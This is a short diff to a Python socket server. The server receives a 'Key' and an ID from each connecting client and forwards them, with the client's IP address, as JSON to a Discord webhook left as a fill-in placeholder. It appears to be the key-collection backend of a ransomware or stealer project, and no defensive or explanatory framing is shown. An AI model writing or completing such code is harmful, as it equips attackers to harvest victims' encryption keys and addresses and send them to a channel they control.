@@ -11,15 +11,16 @@ sock.listen(1)
 while True:
       data, clientAddress = sock.accept()
       Key = data.recv(1024).decode('utf-8')
+      data, clientAddress = sock.accept()
+      ID = data.recv(1024).decode('utf-8')
       dic = {
-        'key_id': key_id,
+        'identification number': ID,
         'Key': Key,
-        'IP': clientAddress
+        'IP address': clientAddress[0]
         }
       json_object = json.dumps(dic,indent=4)
       webhook = SyncWebhook.from_url("-----Your Discord Webhook----")
       webhook.send(json_object)
-      key_id +=1
 
 
 
